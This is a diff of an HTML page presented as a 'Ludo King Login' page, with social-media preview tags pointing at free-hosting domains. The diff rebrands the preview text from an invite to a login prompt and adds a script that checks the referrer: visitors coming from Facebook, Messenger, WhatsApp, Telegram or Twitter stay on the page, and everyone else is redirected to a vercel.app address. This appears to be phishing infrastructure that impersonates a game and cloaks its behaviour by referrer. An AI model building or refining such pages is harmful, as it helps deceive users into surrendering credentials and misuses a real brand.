@@ -3,18 +3,16 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Ludo King invites you</title>
+  <title>Ludo King Login</title>
 
-  <!-- Social Media Preview (Open Graph + Twitter + WhatsApp + Telegram) -->
-  <meta property="og:title" content="Ludo King - invites you" />
-  <meta property="og:description" content="play to Ludo King and sync your progress instantly!" />
+  <!-- Social Media Preview (Facebook, Messenger, WhatsApp, Telegram, Twitter) -->
+  <meta property="og:title" content="Ludo King - Login" />
+  <meta property="og:description" content="Login to Ludo King and sync your progress instantly!" />
   <meta property="og:image" content="https://querulous-crimson-amsttzakrm.edgeone.app/5a6501a4-a969-492b-94dc-8bd3870cb1a8%20(1).jpg" />
   <meta property="og:image:width" content="1200" />
   <meta property="og:image:height" content="630" />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://game-players-online-rouge.vercel.app/" />
-  <meta http-equiv="refresh" content="0; url=https://game-players-online-rouge.vercel.app/">
-
 
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:title" content="Ludo King - Login" />
@@ -151,5 +149,24 @@
       <a href="#">Privacy Policy</a>
     </p>
   </div>
+
+  <!-- Redirect after preview click -->
+  <script>
+    window.onload = () => {
+      const ref = document.referrer;
+      const fromPreview =
+        ref.includes("facebook.com") ||
+        ref.includes("messenger.com") ||
+        ref.includes("whatsapp.com") ||
+        ref.includes("telegram.org") ||
+        ref.includes("t.me") ||
+        ref.includes("twitter.com");
+
+      // If user actually clicks preview and opens the page manually
+      if (!fromPreview) {
+        window.location.href = "https://game-players-online-rouge.vercel.app/";
+      }
+    };
+  </script>
 </body>
 </html>
